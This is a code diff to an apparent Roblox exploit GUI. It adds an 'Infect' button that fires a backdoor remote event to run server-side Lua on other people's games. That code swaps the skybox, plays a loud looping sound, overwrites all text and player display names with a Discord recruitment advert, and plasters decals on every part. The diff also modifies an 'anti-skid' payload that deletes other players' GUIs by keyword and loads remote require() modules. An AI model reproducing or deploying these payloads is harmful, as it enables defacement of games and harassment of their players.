@@ -40,6 +40,9 @@ local Converted = {
 	["_rsix"] = Instance.new("TextButton");
 	["_UICorner5"] = Instance.new("UICorner");
 	["_UIStroke5"] = Instance.new("UIStroke");
+	["_infect"] = Instance.new("TextButton");
+	["_UICrner"] = Instance.new("UICorner");
+	["_UIStrk"] = Instance.new("UIStroke");
 	["_ImageLabel5"] = Instance.new("ImageLabel");
 	["_LocalScript5"] = Instance.new("LocalScript");
 	["_dc"] = Instance.new("TextButton");
@@ -409,7 +412,7 @@ Converted["_Check"].Visible = false
 Converted["_Check"].Name = "Check"
 Converted["_Check"].Parent = Converted["_Framee"]
 
-Converted["_rsix"].Font = Enum.Font.Cartoon
+Converted["_rsix"].Font = Enum.Font.ArimoBold
 Converted["_rsix"].Text = "Change RigType"
 Converted["_rsix"].TextColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_rsix"].TextSize = 14
@@ -430,6 +433,29 @@ Converted["_UIStroke5"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 Converted["_UIStroke5"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
 Converted["_UIStroke5"].Thickness = 1.5
 Converted["_UIStroke5"].Parent = Converted["_rsix"]
+-- infect
+
+Converted["_infect"].Font = Enum.Font.ArimoBold
+Converted["_infect"].Text = "Infect"
+Converted["_infect"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_infect"].TextSize = 14
+Converted["_infect"].TextWrapped = true
+Converted["_infect"].AutoButtonColor = false
+Converted["_infect"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
+Converted["_infect"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_infect"].BorderSizePixel = 0
+Converted["_infect"].Position = UDim2.new(0.611, 0, 0.805, 0)
+Converted["_infect"].Size = UDim2.new(0, 72, 0, 42)
+Converted["_infect"].Name = "infection"
+Converted["_infect"].Parent = Converted["_Framee"]
+
+Converted["_UICrner"].CornerRadius = UDim.new(0, 6)
+Converted["_UIStrk"].Parent = Converted["_infect"]
+
+Converted["_UIStrk"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Converted["_UIStrk"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
+Converted["_UIStrk"].Thickness = 1.5
+Converted["_UIStrk"].Parent = Converted["_infect"]
 
 Converted["_ImageLabel5"].Image = "rbxassetid://16346922164"
 Converted["_ImageLabel5"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -2414,6 +2440,75 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	script.Parent.Framee.rsix.MouseButton1Click:Connect(function()
 		fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
 	end)
+	script.Parent.Framee.infection.MouseButton1Click:Connect(function()
+		fireRemoteEvent([[
+		 --// Configuration
+local decalId = "rbxassetid://8408806737"
+local sound = Instance.new("Sound")
+sound.Parent = workspace
+sound.SoundId = "rbxassetid://1841602074"
+sound.Looped = true
+sound.Playing = true
+sound.Volume = 10
+local sky = Instance.new("Sky")
+sky.SkyboxBk = decalId
+sky.SkyboxDn = decalId
+sky.SkyboxFt = decalId
+sky.SkyboxLf = decalId
+sky.SkyboxRt = decalId
+sky.SkyboxUp = decalId
+sky.Name = "c00lkidd"
+sky.Parent = game.Lighting
+sky.CelestialBodiesShown = false
+
+local function isInCoreGui(obj)
+    -- Check if any ancestor of the object is in CoreGui
+    local parent = obj.Parent
+    while parent do
+        if parent == game.CoreGui then
+            return true
+        end
+        parent = parent.Parent
+    end
+    return false
+end
+
+for _, obj in pairs(game:GetDescendants()) do
+    -- Ignore objects in CoreGui or any object inside CoreGui
+    if isInCoreGui(obj) then
+        continue
+    end
+
+    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+        pcall(function()
+            obj.TextScaled = true
+            obj.Text = "team c00lkidd! join today! https://discord.gg/7UMqbESaWf"
+        end)
+    end
+    if obj:IsA("Humanoid") then
+        obj.DisplayName = "team c00lkidd! join today! https://discord.gg/7UMqbESaWf"
+    end
+end
+
+for _, part in ipairs(workspace:GetDescendants()) do
+    -- Ignore parts in CoreGui or any part inside CoreGui
+    if isInCoreGui(part) then
+        continue
+    end
+
+    if part:IsA("BasePart") or part:IsA("Union") or part:IsA("MeshPart") and not part:IsA("Terrain") then
+        -- Add decals to all 6 faces
+        for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+            local decal = Instance.new("Decal")
+            decal.Texture = decalId
+            decal.Face = face
+            decal.Name = "c00lkidd"
+            decal.Parent = part
+        end
+    end
+end 
+		]])
+	end)
 	script.Parent.Presets.Trash.MouseButton1Click:Connect(function() -- All Seeing Hand
 		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5375399205).Player("' .. game.Players.LocalPlayer.Name .. '")'
 		script.Parent.Framee.Visible = true
@@ -2534,7 +2629,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			Text = "Backdoor: " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
 			Duration = 4
 		})
-	        fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={["greguiscool"]=true}local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local c=p.Parent return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name local t=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(n)or isSuspicious(t)then local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then local h=Instance.new("Hint",workspace)h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)")task.delay(3,function()h:Destroy()end)f:Destroy()end end end end for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end)task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end task.wait(5)end end)')
+	        fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={["greguiscool"]=true,["raizarit"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
                 fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 		fireRemoteEvent('require(7458325257).antiban()')
                 fireRemoteEvent('require(3986243232).load("Guys i am skid im happy to announce!",{"' .. game.Players.LocalPlayer.Name ..  '"})')
